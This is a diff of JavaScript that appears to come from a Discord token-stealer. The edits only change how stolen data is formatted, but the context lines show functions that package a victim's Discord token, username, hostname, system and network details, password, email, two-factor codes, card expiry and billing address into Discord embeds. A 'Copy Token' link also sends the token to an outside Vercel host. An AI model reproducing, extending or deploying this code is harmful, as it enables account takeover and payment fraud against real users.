@@ -255,7 +255,7 @@ const notify = async (ctx, token, user) => {
 
     ctx.embeds[0].fields.unshift({
         name: `<:68602gg:1349774096690315294> Token:`,
-        value: `\`\`\`${token}\`\`\`\n[[Copy Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
+        value: `\`\`\`autohotkey${token}\`\`\`\n[[Copy Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
         inline: false
     })
 
@@ -284,9 +284,9 @@ const notify = async (ctx, token, user) => {
     ctx.embeds.push({
         title: `System Information`,
         fields: [
-            { name: "User", value: `||\`\`\`\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.USERDOMAIN}\`\`\`||` },
-            { name: "System", value: `||\`\`\`\n${Object.entries(system).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, },
-            { name: "Network", value: `||\`\`\`\n${Object.entries(network).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, }
+            { name: "User", value: `\`\`\`autohotkey\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.USERDOMAIN}\`\`\`` },
+            { name: "System", value: `\`\`\`autohotkey\n${Object.entries(system).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\``, },
+            { name: "Network", value: `\`\`\`autohotkey\n${Object.entries(network).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\``, }
         ]
     });
 
@@ -680,7 +680,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                         { name: "Password", value: `\`${password}\``, inline: true },
                         { name: "Email", value: `\`${email}\``, inline: true },
                         { name: "\u200b", value: "\u200b", inline: false },
-                        { name: "Security codes", value: `\`\`\`\n${codes}\`\`\``, inline: false },
+                        { name: "Security codes", value: `\`\`\`autohotkey\n${codes}\`\`\``, inline: false },
                     ],
                 }],
             };
@@ -708,7 +708,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                         { name: "Expiration", value: `\`${request.item["card[exp_month]"]}/${request.item["card[exp_year]"]}\``, inline: true, },
                     ],
                     fields: [
-                        { name: "Address", value: `\`\`\`\nLine 1: ${request["line_1"]}\nLine 2: ${request["line_2"]}\nCity: ${request["city"]}\nState: ${request["state"]}\nPostal Code: ${request["postal_code"]}\nCountry: ${request["country"]}\n\`\`\``, inline: false, },
+                        { name: "Address", value: `\`\`\`autohotkey\nLine 1: ${request["line_1"]}\nLine 2: ${request["line_2"]}\nCity: ${request["city"]}\nState: ${request["state"]}\nPostal Code: ${request["postal_code"]}\nCountry: ${request["country"]}\n\`\`\``, inline: false, },
                     ],
                 }],
             };
